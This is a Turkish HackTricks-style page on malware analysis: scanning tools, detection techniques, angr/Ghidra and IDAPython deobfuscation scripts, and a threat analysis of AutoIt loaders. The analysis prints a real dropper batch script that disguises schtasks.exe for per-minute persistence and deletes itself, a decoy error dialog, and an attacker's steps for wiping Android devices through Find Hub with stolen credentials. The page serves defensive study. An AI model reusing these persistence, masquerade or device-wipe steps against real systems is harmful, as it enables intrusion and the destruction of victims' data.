# Malware Analizi

{{#include ../../banners/hacktricks-training.md}}

## Forensics CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Çevrimiçi Servisler

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Çevrimdışı Antivirus ve Tespit Araçları

### Yara

#### Kurulum
```bash
sudo apt-get install -y yara
```
#### Kuralların hazırlanması

Bu script'i GitHub'dan tüm yara malware rules'u indirmek ve birleştirmek için kullanın: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
_**rules**_ dizinini oluşturun ve script'i çalıştırın. Bu işlem, tüm yara malware rules'larını içeren _**malware_rules.yar**_ adlı bir dosya oluşturacaktır.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Tarama
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Malware için kontrol ve kurallar oluşturma

[**YaraGen**](https://github.com/Neo23x0/yarGen) aracını kullanarak bir binary'den yara rules oluşturabilirsiniz. Bu eğitimlere göz atın: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Kurulum
```
sudo apt-get install -y clamav
```
#### Tarama
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa**, yürütülebilir dosyalarda (PE, ELF, .NET) potansiyel olarak zararlı **yetenekleri** tespit eder. Bu nedenle Att\&ck taktikleri gibi şeyleri veya şu tür şüpheli yetenekleri bulacaktır:

- OutputDebugString hatasını kontrol et
- service olarak çalıştırmak
- process oluşturmak

İndirmek için [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC, Indicator Of Compromise anlamına gelir. Bir IOC, potansiyel olarak istenmeyen bazı yazılımları veya doğrulanmış **malware**'i **tanımlayan koşulların** bir kümesidir. Blue Teams bu tür tanımları kendi **sistemlerinde** ve **ağlarında** bu tür kötü amaçlı dosyaları **arama** için kullanır.\
Bu tanımları paylaşmak çok yararlıdır; bir bilgisayarda malware tespit edildiğinde ve o malware için bir IOC oluşturulduğunda, diğer Blue Teams bunu malware'i daha hızlı tespit etmek için kullanabilir.

Bir IOC oluşturmak veya değiştirmek için bir araç [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
[**Redline**](https://www.fireeye.com/services/freeware/redline.html) gibi araçları kullanarak tanımlanmış IOC'leri bir cihazda **arama** yapabilirsiniz.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) Simple Indicators of Compromise için bir tarayıcıdır.\
Tespit dört yönteme dayanır:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) Linux için geliştirilmiş ve GNU GPLv2 lisansı altında yayımlanmış bir malware tarayıcısıdır; paylaşılan barındırma ortamlarında karşılaşılan tehditler göz önünde bulundurularak tasarlanmıştır. Ağ kenarı saldırı tespit sistemlerinden gelen tehdit verilerini kullanarak saldırılarda aktif olarak kullanılan malware örneklerini çıkarır ve tespit için imzalar üretir. Ek olarak, tehdit verileri kullanıcı gönderimleri (LMD checkout feature) ve malware topluluk kaynaklarından da türetilir.

### rkhunter

[**rkhunter**](http://rkhunter.sourceforge.net) gibi araçlar, dosya sistemini olası **rootkits** ve malware için kontrol etmek amacıyla kullanılabilir.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) farklı teknikler kullanarak yürütülebilir dosyalar içindeki obfuscated strings'i bulmaya çalışacak bir araçtır.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) yürütülebilir dosya içinde bazı temel kontroller yapar (binary data, entropy, URLs and IPs, bazı yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) Windows yürütülebilir dosyaları hakkında imports, exports, headers gibi bilgiler sağlar; ayrıca virus total'u kontrol eder ve potansiyel Att\&ck tekniklerini bulur.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) bir dosyanın **encrypted** olup olmadığını tespit etmek ve ayrıca **packers**'ı bulmak için kullanılan bir araçtır.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) bir Python scriptidir ve text/script dosyalar içinde **obfuscated** ve **encrypted** içerikleri tespit etmek için çeşitli **statistical methods** kullanır. NeoPI'nin amacı **detection of hidden web shell code** tespitine yardımcı olmaktır.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) **obfuscated**/**dodgy code** ile **malwares**/webshells'te sık kullanılan **PHP** fonksiyonlarını kullanan dosyaları tespit etmeye çalışır.

### Apple Binary Signatures

Bir **malware sample** incelerken, binary'nin imzasını her zaman **kontrol etmelisiniz**, çünkü imzalayan **geliştirici** zaten **malware** ile **ilişkili** olabilir.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Tespit Teknikleri

### Dosya Yığma

Bir web sunucusunun **dosyalarını** içeren bir klasörün **en son hangi tarihte güncellendiğini** biliyorsanız, web sunucusundaki **tüm dosyaların** oluşturulma ve değiştirilme **tarihlerini** **kontrol edin**; herhangi bir tarih **şüpheli** görünüyorsa o dosyayı inceleyin.

### Temel Değerler

Bir klasörün dosyalarının **değiştirilmemesi** gerekiyorsa, klasörün **orijinal dosyalarının hash'ini** hesaplayıp **mevcut** olanlarla **karşılaştırabilirsiniz**. Değişmiş olan her şey **şüpheli** olacaktır.

### İstatistiksel Analiz

Bilgi loglarda saklandığında, bir web shell'in en çok erişilen dosyalardan biri olabileceğini dikkate alarak, web sunucusundaki her dosyanın kaç kez erişildiği gibi istatistikleri **kontrol edebilirsiniz**.

---

### Android in-app native telemetry (no root)

Android'de, diğer JNI kütüphaneleri initialize olmadan önce küçük bir logger kütüphanesini preload ederek hedef uygulama sürecinin içindeki native kodu enstrümente edebilirsiniz. Bu, sistem çapında hook'lara veya root'a ihtiyaç duymadan native davranışı erken aşamada görünür kılar. Yaygın bir yaklaşım SoTap'tır: doğru ABI için libsotap.so'yu APK'ya koyup System.loadLibrary("sotap") çağrısını erken bir noktaya (ör. static initializer veya Application.onCreate) enjekte edin, sonra logları internal/external yollarından veya Logcat fallback ile toplayın.

Ayar detayları ve log yolları için Android native reversing sayfasına bakın:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Bazı Android malware'leri ve RASP korumalı uygulamalar, RegisterNatives çağrılmadan önce JNI yöntem adlarını ve imzalarını runtime'da decode ederek gizler. Frida/ptrace enstrümantasyonu anti-debug tarafından sonlandırıldığında, binary içindeki decoder'ı angr ile offline çalıştırıp sonuçları Ghidra'ya yorum olarak geri iterek düz metni yine de kurtarabilirsiniz.

Temel fikir: .so içindeki decoder'ı callable bir fonksiyon olarak ele almak, .rodata'daki obfuscate edilmiş byte blob'lar üzerinde çalıştırmak ve çıktıyı ilk \x00 (C-string terminator) değerine kadar somutlaştırmaktır. Adres uyumsuzluklarını önlemek için angr ve Ghidra'nın aynı image base'i kullanmasını sağlayın.

İş akışı özeti
- Ghidra'da triage: JNI_OnLoad ve RegisterNatives kurulumu içinde decoder'ı ve onun calling convention/argümanlarını belirleyin.
- Her hedef dize için decoder'ı çalıştırmak ve sonuçları dökmek üzere angr (CPython3) çalıştırın.
- Ghidra'da notlandırma: hızlı JNI yeniden yapılandırması için her çağrı noktasında decode edilmiş dizeleri otomatik yorum olarak ekleyin.

Ghidra triage (JNI_OnLoad deseni)
- Ghidra'nın JNINativeMethod yapılarını tanıması için JNI_OnLoad'a JNI veri tiplerini uygulayın.
- Oracle dokümanlarına göre tipik JNINativeMethod:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- RegisterNatives çağrılarını arayın. Eğer kütüphane adı/imzayı, statik bir byte tablosuna (e.g., DAT_00100bf4) referans veren ve (encoded_ptr, out_buf, length) gibi parametreler alan bir local rutin (e.g., FUN_00100e10) ile oluşturuyorsa, bu offline yürütme için ideal bir hedeftir.

angr kurulumu (decoder'ı offline çalıştırma)
- .so'yu Ghidra'da kullanılan aynı base ile (örnek: 0x00100000) yükleyin ve state'i küçük tutmak için external kütüphanelerin otomatik yüklemesini devre dışı bırakın.

<details>
<summary>angr kurulumu ve decoder'ı offline çalıştırma</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Büyük ölçekte, decoder'ın argümanlarına (encoded_ptr, size) çağrı noktalarını statik bir harita olarak oluşturun. Wrapper'lar argümanları gizleyebilir, bu yüzden API kurtarma gürültülü ise bu eşlemeyi Ghidra xrefs'ten manuel olarak oluşturabilirsiniz.

<details>
<summary>angr ile birden çok çağrı noktasını toplu olarak çöz</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ghidra'da call sites'e yorum ekleme
Seçenek A: Yalnızca Jython yorum yazıcı (önceden oluşturulmuş bir JSON kullan)
- angr CPython3 gerektirdiği için, deobfuscation ve annotation'ı ayrı tutun. Önce yukarıdaki angr script'ini çalıştırarak decoded_strings.json dosyasını oluşturun. Ardından her call site'a PRE_COMMENTs yazmak (ve bağlam için çağıran fonksiyon adını dahil etmek) için bu Jython GhidraScript'i çalıştırın:

<details>
<summary>Ghidra Jython scripti decoded JNI strings'i açıklamak için</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Seçenek B: Single CPython script via pyhidra/ghidra_bridge
- Alternatif olarak, angr çalıştıran aynı CPython işleminden Ghidra’nın API’sini sürdürmek için pyhidra veya ghidra_bridge kullanın. Bu, decode_string() çağırıp ara dosya olmadan hemen PRE_COMMENTs ayarlamaya olanak tanır. Mantık Jython script’ini yansıtır: ReferenceManager ile callsite→function haritası oluşturun, angr ile decode edin ve yorumları ayarlayın.

Neden işe yarar ve ne zaman kullanılır
- Offline yürütme RASP/anti-debug’i atlatır: stringleri geri kazanmak için ptrace veya Frida hook’larına gerek yoktur.
- Ghidra ve angr base_addr değerlerini (ör. 0x00100000) hizalı tutmak, fonksiyon/veri adreslerinin araçlar arasında eşleşmesini sağlar.
- Decoder’lar için tekrarlanabilir tarif: dönüşümü saf bir fonksiyon gibi ele alın, taze bir state içinde bir output buffer ayırın, (encoded_ptr, out_ptr, len) ile çağırın, sonra state.solver.eval ile somutlaştırın ve \x00’a kadar C-strings olarak ayrıştırın.

Notlar ve tuzaklar
- Hedef ABI/calling convention’a saygı gösterin. angr.factory.callable arch’a göre bir cc seçer; argümanlar kaymış görünüyorsa cc’yi açıkça belirtin.
- Eğer decoder sıfırlanmış output buffer’ları bekliyorsa, çağrıdan önce state içinde outbuf’u sıfırlarla başlatın.
- Position-independent Android .so için, angr’daki adreslerin Ghidra’da görülenlerle eşleşmesi adına her zaman base_addr sağlayın.
- Uygulama decoder’ı ince stub’ların arkasına sarsa bile call-xrefs listelemek için currentProgram.getReferenceManager() kullanın.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Dinamik Kontrol Akışının Deobfuskasyonu (JMP/CALL RAX Dispatchers)

Modern kötü amaçlı yazılım aileleri Control-Flow Graph (CFG) obfuscation’u yoğun şekilde kötüye kullanıyor: doğrudan bir jump/call yerine hedefi çalışma zamanında hesaplıyor ve `jmp rax` veya `call rax` yürütüyorlar. Küçük bir *dispatcher* (genellikle dokuz talimat) CPU `ZF`/`CF` bayraklarına bağlı olarak nihai hedefi belirler ve bu statik CFG kurtarmayı tamamen bozuyor.

Teknik — SLOW#TEMPEST loader tarafından sergilendiği gibi — sadece IDAPython ve Unicorn CPU emulator’e dayanan üç adımlı bir iş akışıyla bertaraf edilebilir.

### 1. Her indirect jump / call'ı bulun
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. dispatcher byte-code'unu çıkarın
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Unicorn ile iki kez emüle et
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
`run(code,0,0)` ve `run(code,1,1)`'i çalıştırın ve *false* ile *true* dal hedeflerini elde edin.

### 4. Doğrudan jump / call için geri yama yap
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Patching'ten sonra IDA'yı fonksiyonu yeniden analiz etmeye zorlayın, böylece tam CFG ve Hex-Rays çıktısı geri yüklenir:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Dolaylı API çağrılarını etiketleyin

Her `call rax`'in gerçek hedefi bilindiğinde IDA'ya bunu söyleyebilir ve böylece parametre türleri ve değişken isimleri otomatik olarak kurtarılabilir:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Pratik faydalar

* Gerçek CFG'yi geri kazandırır → decompilation *10* satırdan binlerce satıra çıkar.
* string-cross-reference & xrefs'i etkinleştirir; behaviour reconstruction'ı çok kolaylaştırır.
* Scripts yeniden kullanılabilir: onları aynı trick ile korunmuş herhangi bir loader'ın içine bırakın.

---

## AutoIt tabanlı loader'lar: .a3x decryption, Task Scheduler masquerade and RAT injection

Bu intrusion pattern, imzalı bir MSI, .a3x olarak derlenmiş AutoIt loader'ları ve zararsız bir uygulama gibi görünen bir Task Scheduler işini zincirler.

### MSI → custom actions → AutoIt orkestratörü

MSI custom actions tarafından yürütülen süreç ağacı ve komutlar:

- MsiExec.exe → cmd.exe ile install.bat'ı çalıştırmak için
- WScript.exe bir aldatıcı hata iletişim kutusu göstermek için
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (loader'ı bırakır, persistence'i ayarlar, kendi kendini temizler):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (kullanıcı yemi):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Ana artefaktlar ve maskeleme:
- AutoIt3.exe ve IoKlTr.au3 dosyalarını C:\Users\Public\Music dizinine bırakır
- Copies schtasks.exe to hwpviewer.exe (masquerades as Hangul Word Processor viewer)
- "IoKlTr" adlı ve her 1 dakikada bir çalışan bir planlı görev oluşturur
- Başlangıç LNK'i Smart_Web.lnk olarak görülür; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- %APPDATA%\Google\Browser\ alt klasörlerinde `adb` veya `adv` içeren modüller sahneler ve bunları autoit.vbs/install.bat yardımcılarıyla başlatır

Adli triage ipuçları:
- schtasks sorgulaması: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Task XML ile aynı konumda bulunan yeniden adlandırılmış schtasks.exe kopyalarını ara: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Yaygın yollar: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- İşlem oluşturma olaylarını ilişkilendir: AutoIt3.exe'in meşru Windows ikili dosyalarını (ör., cleanmgr.exe, hncfinder.exe) başlatması

### AutoIt loader'ları ve .a3x payload'ın şifre çözümü → enjeksiyon

- AutoIt modülleri `#AutoIt3Wrapper_Outfile_type=a3x` ile derlenir ve gömülü payload'ları zararsız süreçlere enjekte etmeden önce şifre çözer.
- Gözlemlenen aileler: QuasarRAT (hncfinder.exe içine enjekte edilmiş) ve RftRAT/RFTServer (cleanmgr.exe içine enjekte edilmiş) ile RemcosRAT modülleri (`Remcos\RunBinary.a3x`).
- Şifre çözme deseni: HMAC ile bir AES anahtarı türetir, gömülü blob'u şifre çözer, ardından düz metin modülünü enjekte eder.

Genel şifre çözme iskeleti (tam HMAC girişi/algoritması aileye özgüdür):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) of the target host (e.g., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory with decrypted module/shellcode
- CreateRemoteThread or QueueUserAPC to execute payload

Tehdit avı fikirleri
- AutoIt3.exe parented by MsiExec.exe or WScript.exe spawning system utilities
- Files with `.a3x` extensions or AutoIt script runners under public/user-writable paths
- Suspicious scheduled tasks executing AutoIt3.exe or binaries not signed by Microsoft, with minute-level triggers

### Account-takeover abuse of Android Find My Device (Find Hub)

Windows ihlali sırasında, operatörler çalınan Google kimlik bilgilerini kullanarak mağdurun Android cihazlarını tekrar tekrar sildiler, bildirimleri bastırdılar ve mağdurun oturum açmış masaüstü messenger'ı üzerinden erişimi genişlettiler.

Operatör adımları (oturum açmış bir tarayıcı oturumundan):
- Google Account → Security → Your devices'i gözden geçirin; Find My Phone → Find Hub'i takip edin (https://www.google.com/android/find)
- Cihazı seçin → Google parolasını yeniden girin → "Erase device" (factory reset) komutunu verin; kurtarmayı geciktirmek için tekrarlayın
- İsteğe bağlı: güvenlik bildirimlerini gizlemek için bağlı posta kutusundaki (ör. Naver) uyarı e-postalarını temizleyin

## AdaptixC2: Configuration Extraction and TTPs

Ayrıntılı sayfaya bakın:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
